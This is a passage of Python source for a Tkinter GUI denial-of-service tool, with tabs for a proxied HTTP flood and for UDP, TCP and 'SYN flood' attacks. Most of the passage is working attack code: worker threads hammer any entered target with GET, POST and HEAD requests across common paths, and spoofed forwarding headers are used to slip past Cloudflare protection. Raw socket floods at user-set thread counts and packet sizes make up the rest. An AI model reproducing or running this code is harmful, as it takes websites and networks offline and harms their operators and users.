        self.ddos_port_var = tk.StringVar(value="80")
        self.ddos_port_entry = ttk.Entry(controls_frame, textvariable=self.ddos_port_var, width=10, font=("Arial", 10))
        self.ddos_port_entry.grid(row=1, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Thread count
        ttk.Label(controls_frame, text="Threads:", font=("Arial", 10, "bold")).grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_threads_var = tk.StringVar(value="10")
        self.ddos_threads_spinbox = tk.Spinbox(controls_frame, from_=1, to=1000, textvariable=self.ddos_threads_var, width=10, font=("Arial", 10))
        self.ddos_threads_spinbox.grid(row=2, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Mbps entry
        ttk.Label(controls_frame, text="Bandwidth (Mbps):", font=("Arial", 10, "bold")).grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.ddos_mbps_var = tk.StringVar(value="10")
        self.ddos_mbps_spinbox = tk.Spinbox(controls_frame, from_=1, to=1200, textvariable=self.ddos_mbps_var, width=10, font=("Arial", 10))
        self.ddos_mbps_spinbox.grid(row=3, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Cloudflare bypass checkbox
        self.ddos_cf_bypass_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(controls_frame, text="Cloudflare Bypass", variable=self.ddos_cf_bypass_var).grid(row=4, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        
        # 2Captcha bypass checkbox
        self.ddos_2captcha_bypass_var = tk.BooleanVar(value=False)
        ttk.Checkbutton(controls_frame, text="2Captcha Bypass", variable=self.ddos_2captcha_bypass_var).grid(row=4, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        controls_frame.grid_columnconfigure(1, weight=1)
        
        # Attack buttons
        buttons_frame = ttk.Frame(controls_frame)
        buttons_frame.grid(row=5, column=0, columnspan=2, pady=10)
        
        self.ddos_start_btn = ttk.Button(buttons_frame, text="Start Attack", command=self.start_ddos_attack, style='Danger.TButton')
        self.ddos_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.ddos_stop_btn = ttk.Button(buttons_frame, text="Stop Attack", command=self.stop_ddos_attack, state=tk.DISABLED)
        self.ddos_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Proxy selection frame
        proxy_selection_frame = ttk.LabelFrame(ddos_main_frame, text="Proxies for Attack", padding=10)
        proxy_selection_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Proxy status label
        self.ddos_proxy_status_label = ttk.Label(proxy_selection_frame, text="Enabled Proxies: 0", font=("Arial", 10, "bold"))
        self.ddos_proxy_status_label.pack(anchor=tk.W, pady=(0, 10))
        
        # Proxy list frame
        proxy_list_frame = ttk.Frame(proxy_selection_frame)
        proxy_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create a canvas and scrollbar for proxy list
        canvas_frame = ttk.Frame(proxy_list_frame)
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        self.proxy_canvas = tk.Canvas(canvas_frame, height=100)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.proxy_canvas.yview)
        self.proxy_scrollable_frame = ttk.Frame(self.proxy_canvas)
        
        self.proxy_scrollable_frame.bind(
            "<Configure>",
            lambda e: self.proxy_canvas.configure(scrollregion=self.proxy_canvas.bbox("all"))
        )
        
        self.proxy_canvas.create_window((0, 0), window=self.proxy_scrollable_frame, anchor="nw")
        self.proxy_canvas.configure(yscrollcommand=scrollbar.set)
        
        self.proxy_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Terminal output frame
        terminal_frame = ttk.LabelFrame(ddos_main_frame, text="Attack Terminal", padding=10)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Terminal text area
        self.ddos_terminal = scrolledtext.ScrolledText(terminal_frame, height=20, font=("Consolas", 9))
        self.ddos_terminal.pack(fill=tk.BOTH, expand=True)
        
        # Update proxy list initially
        self.update_ddos_proxy_list()
        
        # Initialize attack variables
        self.ddos_attack_running = False
        self.packet_count = 0
        
        # Update proxy status and list initially
        self.update_ddos_proxy_status()
        self.update_ddos_proxy_list()
        
    def start_ddos_attack(self):
        target = self.ddos_target_var.get().strip()
        port = self.ddos_port_var.get().strip()
        threads = self.ddos_threads_var.get().strip()
        mbps = self.ddos_mbps_var.get().strip()
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target URL/IP")
            return
        
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError("Port out of range")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid port number (1-65535)")
            return
        
        try:
            thread_count = int(threads)
            if thread_count <= 0:
                raise ValueError("Thread count must be positive")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid thread count")
            return
        
        try:
            mbps_val = int(mbps)
            if mbps_val <= 0 or mbps_val > 1200:
                raise ValueError("Mbps value must be between 1 and 1200")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid Mbps value (1-1200)")
            return
        
        # Check if bypass options are enabled
        cf_bypass = self.ddos_cf_bypass_var.get()
        captcha_bypass = self.ddos_2captcha_bypass_var.get()
        
        # Start attack
        self.ddos_attack_running = True
        self.packet_count = 0
        self.ddos_start_btn.config(state=tk.DISABLED)
        self.ddos_stop_btn.config(state=tk.NORMAL)
        
        bypass_info = []
        if cf_bypass:
            bypass_info.append("CF")
        if captcha_bypass:
            bypass_info.append("2Captcha")
        
        bypass_text = f" with {'+'.join(bypass_info)} bypass" if bypass_info else ""
        
        self.log_to_ddos_terminal("Starting D-Attack against {}:{} with {} threads at {} Mbps{}...\n".format(target, port, threads, mbps, bypass_text))
        
        # Start attack threads
        for i in range(thread_count):
            thread = threading.Thread(target=self.ddos_worker, args=(target, port_num, mbps_val, cf_bypass, captcha_bypass), daemon=True)
            thread.start()
        
    def stop_ddos_attack(self):
        self.ddos_attack_running = False
        self.ddos_start_btn.config(state=tk.NORMAL)
        self.ddos_stop_btn.config(state=tk.DISABLED)
        self.log_to_ddos_terminal("D-Attack stopped. Total packets sent: {}\n".format(self.packet_count))
    
    def ddos_worker(self, target, port, mbps, cf_bypass=True, captcha_bypass=False):
        # Real DDoS attack by sending actual network requests through proxies
        import socket
        import ssl
        import random
        import requests
        from urllib.parse import urlparse
        
        # Calculate how much data to send based on Mbps
        # 1 Mbps = 1,000,000 bits per second = 125,000 bytes per second
        bytes_per_second = mbps * 125000
        
        # Read proxies from file
        proxies_list = self.load_proxies()
        
        while self.ddos_attack_running:
            try:
                # Select a random proxy
                proxy = random.choice(proxies_list) if proxies_list else None
                
                if proxy:
                    # Use requests with proxy for better compatibility
                    proxy_parts = proxy.split(':')
                    if len(proxy_parts) == 2:
                        proxy_url = f"http://{proxy}"
                        proxies = {
                            'http': proxy_url,
                            'https': proxy_url,
                        }
                        
                        # Create session with proxy
                        session = requests.Session()
                        session.headers.update({'User-Agent': self.current_user_agent})
                        
                        # Add bypass headers if enabled
                        if cf_bypass:
                            # Add headers to bypass Cloudflare
                            session.headers.update({
                                'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Client-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Host': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'X-Forwared-Host': f"{target}",
                                'CF-Connecting-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                'True-Client-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                            })
                        
                        # Try to make requests through proxy
                        try:
                            # Send multiple requests to increase traffic
                            request_count = min(20, mbps // 5 + 1)  # Increased from 10 to 20
                            for _ in range(request_count):
                                # Add random headers to bypass protections
                                headers = {
                                    'User-Agent': self.current_user_agent,
                                    'Accept': '*/*',
                                    'Accept-Language': 'en-US,en;q=0.9,en-GB;q=0.8,en-CA;q=0.7',
                                    'Accept-Encoding': 'gzip, deflate, br',
                                    'Connection': 'keep-alive',
                                    'Upgrade-Insecure-Requests': '1',
                                    'Cache-Control': 'no-cache',
                                    'Pragma': 'no-cache',
                                    'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Client-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Originating-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Remote-IP': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Remote-Addr': f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}",
                                    'X-Forwarded-Host': f"{target}",
                                    'X-Forwarded-Server': f"{target}",
                                }
                                
                                # Make GET request through proxy
                                try:
                                    response = session.get(
                                        f"http://{target}:{port}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Make POST request through proxy
                                try:
                                    session.post(
                                        f"http://{target}:{port}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False,
                                        data={'data': 'a' * min(2048, max(100, bytes_per_second // 50))}  # Increased data size
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Make HEAD request through proxy
                                try:
                                    session.head(
                                        f"http://{target}:{port}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Try with HTTPS as well
                                try:
                                    session.get(
                                        f"https://{target}:{port if port != 80 else 443}/",
                                        proxies=proxies,
                                        headers=headers,
                                        timeout=10,
                                        verify=False
                                    )
                                except requests.exceptions.RequestException:
                                    pass  # Continue to next request
                                
                                # Try multiple path variations
                                paths = ['/', '/index.html', '/api/', '/admin/', '/login', '/app/', '/static/']
                                for path in paths:
                                    try:
                                        session.get(
                                            f"http://{target}:{port}{path}",
                                            proxies=proxies,
                                            headers=headers,
                                            timeout=10,
                                            verify=False
                                        )
                                    except requests.exceptions.RequestException:
                                        pass
                        except requests.exceptions.RequestException:
                            # If there's an error, continue with next iteration
                            pass
                        
                        # Close session
                        try:
                            session.close()
                        except:
                            pass  # Ignore errors when closing session
                    else:
                        # If proxy format is invalid, try direct connection
                        self.direct_ddos_request(target, port, mbps, bytes_per_second)
                else:
                    # If no proxies available, use direct connection
                    self.direct_ddos_request(target, port, mbps, bytes_per_second)
                
                # Increment packet count
                self.packet_count += 1
                
                # Update terminal in main thread
                self.root.after(0, lambda: self.log_to_ddos_terminal(
                    f"The glitch system <package sent {self.packet_count}>\n"))
                
                # Small delay
                time.sleep(0.01)
                
            except Exception as e:
                # Keep trying even if there are connection errors
                time.sleep(0.01)  # Small delay to prevent excessive CPU usage
                continue
    
    def direct_ddos_request(self, target, port, mbps, bytes_per_second):
        # Direct connection when no proxy is available
        import socket
        import ssl
        import random
        
        try:
            # Create socket connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)  # 3 second timeout
            
            # Connect to target
            sock.connect((target, port))
            
            # Determine if we need SSL based on port
            if port == 443 or target.startswith('https'):
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=target)
            
            # Create HTTP GET request
            request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.current_user_agent}\r\nConnection: keep-alive\r\n\r\n"
            
            # Send request
            sock.send(request.encode())
            
            # Send additional data based on Mbps setting
            # Create random data to increase bandwidth usage
            random_data_size = min(1024, max(100, bytes_per_second // 100))  # Adjust data size based on Mbps
            random_data = b'A' * random_data_size
            
            # Try to send additional data to increase bandwidth
            try:
                # Send multiple small requests to keep connection alive and increase traffic
                for _ in range(min(10, mbps // 10 + 1)):  # More requests for higher Mbps
                    sock.send(b'GET / HTTP/1.1\r\nHost: ' + target.encode() + b'\r\n\r\n')
                    time.sleep(0.01)  # Small delay between requests
            except:
                pass
            
            # Receive response to keep connection active
            try:
                sock.recv(1024)
            except:
                pass  # Ignore if no response
            
            # Close socket
            sock.close()
        except:
            pass  # Ignore connection errors
    
    def load_proxies(self):
        # Load proxies from proxies.txt file
        proxies = []
        try:
            with open('proxies.txt', 'r', encoding='utf-8-sig') as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        # Validate proxy format (IP:PORT)
                        parts = line.split(':')
                        if len(parts) == 2:
                            ip, port = parts
                            # Basic IP validation
                            ip_parts = ip.split('.')
                            if len(ip_parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip_parts):
                                # Basic port validation
                                port_num = int(port)
                                if 1 <= port_num <= 65535:
                                    proxies.append(line)
        except FileNotFoundError:
            # If file doesn't exist, return empty list
            pass
        except UnicodeDecodeError:
            # If UTF-8 fails, try with latin-1
            try:
                with open('proxies.txt', 'r', encoding='latin-1') as f:
                    for line in f:
                        line = line.strip()
                        if line and ':' in line:
                            # Validate proxy format (IP:PORT)
                            parts = line.split(':')
                            if len(parts) == 2:
                                ip, port = parts
                                # Basic IP validation
                                ip_parts = ip.split('.')
                                if len(ip_parts) == 4 and all(part.isdigit() and 0 <= int(part) <= 255 for part in ip_parts):
                                    # Basic port validation
                                    port_num = int(port)
                                    if 1 <= port_num <= 65535:
                                        proxies.append(line)
            except:
                pass
        except ValueError:
            # Handle any invalid port numbers
            pass
        
        # Filter to only return enabled proxies if we have the proxy management system
        if hasattr(self, 'proxies'):
            enabled_proxies = [f"{proxy['ip']}:{proxy['port']}" for proxy in self.proxies if proxy.get('enabled', False)]
            return enabled_proxies
        
        return proxies
    
    def log_to_ddos_terminal(self, message):
        try:
            # Add message to terminal
            self.ddos_terminal.insert(tk.END, message)
            
            # Color the "The glitch system" part green
            if "The glitch system" in message:
                # Find the index of the newly inserted text
                end_index = self.ddos_terminal.index(tk.END)
                line_num = int(end_index.split('.')[0]) - 1  # Get the line number of the last line
                
                # Find the start and end of the line
                line_start = f"{line_num}.0"
                line_end = f"{line_num}.end"
                
                # Search for "The glitch system" in the line
                search_result = self.ddos_terminal.search("The glitch system", line_start, line_end)
                
                if search_result:
                    end_pos = f"{search_result}+{len('The glitch system')}c"
                    self.ddos_terminal.tag_add("green", search_result, end_pos)
                    self.ddos_terminal.tag_config("green", foreground="green")
            
            # Scroll to end
            self.ddos_terminal.see(tk.END)
            
            # Update the UI
            self.ddos_terminal.update_idletasks()
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
    
    def create_udp_tcp_ui(self):
        # Main frame for UDP/TCP attack
        udp_tcp_main_frame = ttk.LabelFrame(self.udp_tcp_frame, text="UDP/TCP Attack - Network Layer Attacks", padding=10)
        udp_tcp_main_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Controls frame
        controls_frame = ttk.LabelFrame(udp_tcp_main_frame, text="Attack Configuration", padding=10)
        controls_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Target entry
        ttk.Label(controls_frame, text="Target IP/Host:", font=("Arial", 10, "bold")).grid(row=0, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_target_var = tk.StringVar()
        self.udp_tcp_target_entry = ttk.Entry(controls_frame, textvariable=self.udp_tcp_target_var, width=50, font=("Arial", 10))
        self.udp_tcp_target_entry.grid(row=0, column=1, sticky=tk.EW, padx=(0, 10), pady=5)
        
        # Port entry
        ttk.Label(controls_frame, text="Target Port:", font=("Arial", 10, "bold")).grid(row=1, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_port_var = tk.StringVar(value="80")
        self.udp_tcp_port_entry = ttk.Entry(controls_frame, textvariable=self.udp_tcp_port_var, width=10, font=("Arial", 10))
        self.udp_tcp_port_entry.grid(row=1, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Protocol selection
        ttk.Label(controls_frame, text="Protocol:", font=("Arial", 10, "bold")).grid(row=2, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_protocol_var = tk.StringVar(value="UDP")
        self.udp_tcp_protocol_combo = ttk.Combobox(controls_frame, textvariable=self.udp_tcp_protocol_var, 
                                            values=["UDP", "TCP", "TCP SYN Flood"], state="readonly", width=15)
        self.udp_tcp_protocol_combo.grid(row=2, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Thread count
        ttk.Label(controls_frame, text="Threads:", font=("Arial", 10, "bold")).grid(row=3, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_threads_var = tk.StringVar(value="10")
        self.udp_tcp_threads_spinbox = tk.Spinbox(controls_frame, from_=1, to=1000, textvariable=self.udp_tcp_threads_var, width=10, font=("Arial", 10))
        self.udp_tcp_threads_spinbox.grid(row=3, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Packet size
        ttk.Label(controls_frame, text="Packet Size (bytes):", font=("Arial", 10, "bold")).grid(row=4, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_packet_size_var = tk.StringVar(value="1024")
        self.udp_tcp_packet_size_spinbox = tk.Spinbox(controls_frame, from_=64, to=65535, textvariable=self.udp_tcp_packet_size_var, width=10, font=("Arial", 10))
        self.udp_tcp_packet_size_spinbox.grid(row=4, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        # Attack type
        ttk.Label(controls_frame, text="Attack Type:", font=("Arial", 10, "bold")).grid(row=5, column=0, sticky=tk.W, padx=(0, 10), pady=5)
        self.udp_tcp_attack_type_var = tk.StringVar(value="Flood")
        self.udp_tcp_attack_type_combo = ttk.Combobox(controls_frame, textvariable=self.udp_tcp_attack_type_var, 
                                            values=["Flood", "Port Scan", "Connection Flood"], state="readonly", width=15)
        self.udp_tcp_attack_type_combo.grid(row=5, column=1, sticky=tk.W, padx=(0, 10), pady=5)
        
        controls_frame.grid_columnconfigure(1, weight=1)
        
        # Attack buttons
        buttons_frame = ttk.Frame(controls_frame)
        buttons_frame.grid(row=6, column=0, columnspan=2, pady=10)
        
        self.udp_tcp_start_btn = ttk.Button(buttons_frame, text="Start Attack", command=self.start_udp_tcp_attack, style='Danger.TButton')
        self.udp_tcp_start_btn.pack(side=tk.LEFT, padx=5)
        
        self.udp_tcp_stop_btn = ttk.Button(buttons_frame, text="Stop Attack", command=self.stop_udp_tcp_attack, state=tk.DISABLED)
        self.udp_tcp_stop_btn.pack(side=tk.LEFT, padx=5)
        
        # Proxy selection frame
        proxy_selection_frame = ttk.LabelFrame(udp_tcp_main_frame, text="Proxies for Attack", padding=10)
        proxy_selection_frame.pack(fill=tk.X, padx=5, pady=5)
        
        # Proxy status label
        self.udp_tcp_proxy_status_label = ttk.Label(proxy_selection_frame, text="Enabled Proxies: 0", font=("Arial", 10, "bold"))
        self.udp_tcp_proxy_status_label.pack(anchor=tk.W, pady=(0, 10))
        
        # Proxy list frame
        proxy_list_frame = ttk.Frame(proxy_selection_frame)
        proxy_list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create a canvas and scrollbar for proxy list
        canvas_frame = ttk.Frame(proxy_list_frame)
        canvas_frame.pack(fill=tk.BOTH, expand=True)
        
        self.udp_tcp_proxy_canvas = tk.Canvas(canvas_frame, height=100)
        scrollbar = ttk.Scrollbar(canvas_frame, orient="vertical", command=self.udp_tcp_proxy_canvas.yview)
        self.udp_tcp_proxy_scrollable_frame = ttk.Frame(self.udp_tcp_proxy_canvas)
        
        self.udp_tcp_proxy_scrollable_frame.bind(
            "<Configure>",
            lambda e: self.udp_tcp_proxy_canvas.configure(scrollregion=self.udp_tcp_proxy_canvas.bbox("all"))
        )
        
        self.udp_tcp_proxy_canvas.create_window((0, 0), window=self.udp_tcp_proxy_scrollable_frame, anchor="nw")
        self.udp_tcp_proxy_canvas.configure(yscrollcommand=scrollbar.set)
        
        self.udp_tcp_proxy_canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
        # Terminal output frame
        terminal_frame = ttk.LabelFrame(udp_tcp_main_frame, text="Attack Terminal", padding=10)
        terminal_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Terminal text area
        self.udp_tcp_terminal = scrolledtext.ScrolledText(terminal_frame, height=20, font=("Consolas", 9))
        self.udp_tcp_terminal.pack(fill=tk.BOTH, expand=True)
        
        # Update proxy list initially
        self.update_udp_tcp_proxy_list()
        
        # Initialize attack variables
        self.udp_tcp_attack_running = False
        self.udp_tcp_packet_count = 0
        
        # Update proxy status initially
        self.update_udp_tcp_proxy_status()
    
    def start_udp_tcp_attack(self):
        target = self.udp_tcp_target_var.get().strip()
        port = self.udp_tcp_port_var.get().strip()
        protocol = self.udp_tcp_protocol_var.get()
        threads = self.udp_tcp_threads_var.get().strip()
        packet_size = self.udp_tcp_packet_size_var.get().strip()
        attack_type = self.udp_tcp_attack_type_var.get()
        
        if not target:
            messagebox.showwarning("Warning", "Please enter a target IP/Host")
            return
        
        try:
            port_num = int(port)
            if not (1 <= port_num <= 65535):
                raise ValueError("Port out of range")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid port number (1-65535)")
            return
        
        try:
            thread_count = int(threads)
            if thread_count <= 0:
                raise ValueError("Thread count must be positive")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid thread count")
            return
        
        try:
            packet_size_val = int(packet_size)
            if packet_size_val < 64 or packet_size_val > 65535:
                raise ValueError("Packet size must be between 64 and 65535 bytes")
        except ValueError:
            messagebox.showerror("Error", "Please enter a valid packet size (64-65535 bytes)")
            return
        
        # Start attack
        self.udp_tcp_attack_running = True
        self.udp_tcp_packet_count = 0
        self.udp_tcp_start_btn.config(state=tk.DISABLED)
        self.udp_tcp_stop_btn.config(state=tk.NORMAL)
        
        self.log_to_udp_tcp_terminal("Starting {} {} attack against {}:{} with {} threads and {} byte packets...\n".format(attack_type, protocol, target, port, threads, packet_size))
        
        # Start attack threads
        for i in range(thread_count):
            thread = threading.Thread(target=self.udp_tcp_worker, args=(target, port_num, protocol, attack_type, packet_size_val), daemon=True)
            thread.start()
    
    def stop_udp_tcp_attack(self):
        self.udp_tcp_attack_running = False
        self.udp_tcp_start_btn.config(state=tk.NORMAL)
        self.udp_tcp_stop_btn.config(state=tk.DISABLED)
        self.log_to_udp_tcp_terminal("UDP/TCP attack stopped. Total packets sent: {}\n".format(self.udp_tcp_packet_count))
    
    def udp_tcp_worker(self, target, port, protocol, attack_type, packet_size):
        import socket
        import random
        import struct
        
        # Create random data for packets
        packet_data = b'A' * packet_size
        
        while self.udp_tcp_attack_running:
            try:
                if protocol == "UDP":
                    # UDP flood attack - create multiple sockets to increase load
                    for _ in range(10):  # Send 10 packets at once
                        try:
                            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                            sock.sendto(packet_data, (target, port))
                            sock.close()
                        except:
                            try:
                                sock.close()
                            except:
                                pass
                    
                elif protocol == "TCP":
                    # TCP connection attack - try to keep connections open longer
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(1)  # Shorter timeout to increase attempts
                        result = sock.connect_ex((target, port))
                        if result == 0:  # Connection successful
                            # Send multiple data packets before closing
                            for _ in range(3):
                                try:
                                    sock.send(packet_data[:min(2048, len(packet_data))])  # Send larger chunks
                                except:
                                    break
                        sock.close()
                    except:
                        try:
                            sock.close()
                        except:
                            pass
                        
                elif protocol == "TCP SYN Flood":
                    # TCP SYN flood attack - don't complete handshake
                    try:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(0.5)  # Very short timeout
                        sock.connect((target, port))
                        # Don't send anything, just establish connection and close
                    except:
                        # Connection might fail, which is expected in SYN flood
                        pass
                    finally:
                        try:
                            sock.close()
                        except:
                            pass
                
                # Increment packet count
                self.udp_tcp_packet_count += 1
                
                # Update terminal in main thread every 100 packets
                if self.udp_tcp_packet_count % 100 == 0:
                    self.root.after(0, lambda: self.log_to_udp_tcp_terminal(
                        f"The glitch system <UDP/TCP packet sent {self.udp_tcp_packet_count}>\n"))
                
                # Small delay to prevent excessive CPU usage
                time.sleep(0.001)
                
            except Exception as e:
                # Keep trying even if there are connection errors
                time.sleep(0.01)  # Small delay to prevent excessive CPU usage
                continue
    
    def log_to_udp_tcp_terminal(self, message):
        try:
            # Add message to terminal
            self.udp_tcp_terminal.insert(tk.END, message)
            
            # Color the "The glitch system" part green
            if "The glitch system" in message:
                # Find the index of the newly inserted text
                end_index = self.udp_tcp_terminal.index(tk.END)
                line_num = int(end_index.split('.')[0]) - 1  # Get the line number of the last line
                
                # Find the start and end of the line
                line_start = f"{line_num}.0"
                line_end = f"{line_num}.end"
                
                # Search for "The glitch system" in the line
                search_result = self.udp_tcp_terminal.search("The glitch system", line_start, line_end)
                
                if search_result:
                    end_pos = f"{search_result}+{len('The glitch system')}c"
                    self.udp_tcp_terminal.tag_add("green", search_result, end_pos)
                    self.udp_tcp_terminal.tag_config("green", foreground="green")
            
            # Scroll to end
            self.udp_tcp_terminal.see(tk.END)
            
            # Update the UI
            self.udp_tcp_terminal.update_idletasks()
        except tk.TclError:
            # Handle case where GUI element is destroyed
            pass
    
    def update_ddos_proxy_status(self):
        # Update the proxy status label in DDoS tab
        if hasattr(self, 'proxies'):
            enabled_count = len(self.get_enabled_proxies())
        else:
            enabled_count = 0
        self.ddos_proxy_status_label.config(text=f"Enabled Proxies: {enabled_count}")
    
    def update_ddos_proxy_list(self):
        # Update the proxy list in DDoS tab with individual enable/disable buttons
        # Check if proxies exist
        if not hasattr(self, 'proxies'):
            return
        
        # Clear existing widgets
        for widget in self.proxy_scrollable_frame.winfo_children():
            widget.destroy()
        
        # Add proxies with individual enable/disable buttons
        for i, proxy in enumerate(self.proxies):
            proxy_frame = ttk.Frame(self.proxy_scrollable_frame)
            proxy_frame.pack(fill=tk.X, pady=2)
            
            # Proxy info label
            proxy_info = ttk.Label(proxy_frame, text=f"{proxy['ip']}:{proxy['port']}", font=("Arial", 9))
            proxy_info.pack(side=tk.LEFT, padx=(0, 10))
            
            # Status label
            status_text = proxy['status']
            status_label = ttk.Label(proxy_frame, text=status_text, font=("Arial", 8))
            status_label.pack(side=tk.LEFT, padx=(0, 10))
            
            # Enable/Disable button
            btn_text = "Disable" if proxy['enabled'] else "Enable"
            btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
            
            btn = ttk.Button(
                proxy_frame, 
                text=btn_text, 
                command=lambda proxy_local=proxy: self.toggle_ddos_proxy(proxy_local),
                style=btn_style
            )
            btn.pack(side=tk.RIGHT)
            
            # Store button reference to update later
            proxy['button'] = btn
        
        # Update the canvas scroll region
        self.proxy_canvas.update_idletasks()
        self.proxy_canvas.configure(scrollregion=self.proxy_canvas.bbox("all"))
    
    def toggle_ddos_proxy(self, proxy):
        # Toggle individual proxy in DDoS tab
        proxy['enabled'] = not proxy['enabled']
        
        # Update button text and style
        btn_text = "Disable" if proxy['enabled'] else "Enable"
        btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
        proxy['button'].config(text=btn_text, style=btn_style)
        
        # Update proxy status in the main proxy management
        self.update_ddos_proxy_status()
        self.update_udp_tcp_proxy_status()
        
        # Update the main proxy list display
        self.update_proxy_list()
        
        # Update proxy lists in attack tabs after loading proxies
        self.root.after(100, self.update_ddos_proxy_list)
        self.root.after(100, self.update_udp_tcp_proxy_list)
    
    def update_udp_tcp_proxy_list(self):
        # Update the proxy list in UDP/TCP tab with individual enable/disable buttons
        # Check if proxies exist
        if not hasattr(self, 'proxies'):
            return
        
        # Clear existing widgets
        for widget in self.udp_tcp_proxy_scrollable_frame.winfo_children():
            widget.destroy()
        
        # Add proxies with individual enable/disable buttons
        for i, proxy in enumerate(self.proxies):
            proxy_frame = ttk.Frame(self.udp_tcp_proxy_scrollable_frame)
            proxy_frame.pack(fill=tk.X, pady=2)
            
            # Proxy info label
            proxy_info = ttk.Label(proxy_frame, text=f"{proxy['ip']}:{proxy['port']}", font=("Arial", 9))
            proxy_info.pack(side=tk.LEFT, padx=(0, 10))
            
            # Status label
            status_text = proxy['status']
            status_label = ttk.Label(proxy_frame, text=status_text, font=("Arial", 8))
            status_label.pack(side=tk.LEFT, padx=(0, 10))
            
            # Enable/Disable button
            btn_text = "Disable" if proxy['enabled'] else "Enable"
            btn_style = 'Danger.TButton' if proxy['enabled'] else 'TButton'
            
            btn = ttk.Button(
                proxy_frame, 
                text=btn_text, 
                command=lambda proxy_local=proxy: self.toggle_udp_tcp_proxy(proxy_local),
                style=btn_style
            )
            btn.pack(side=tk.RIGHT)
            
            # Store button reference to update later
            proxy['udp_tcp_button'] = btn
        
        # Update the canvas scroll region
        self.udp_tcp_proxy_canvas.update_idletasks()
        self.udp_tcp_proxy_canvas.configure(scrollregion=self.udp_tcp_proxy_canvas.bbox("all"))
    
    def toggle_udp_tcp_proxy(self, proxy):
        # Toggle individual proxy in UDP/TCP tab
        proxy['enabled'] = not proxy['enabled']
        
        # Update button text and style
        btn_text = "Disable" if proxy['enabled'] else "Enable"
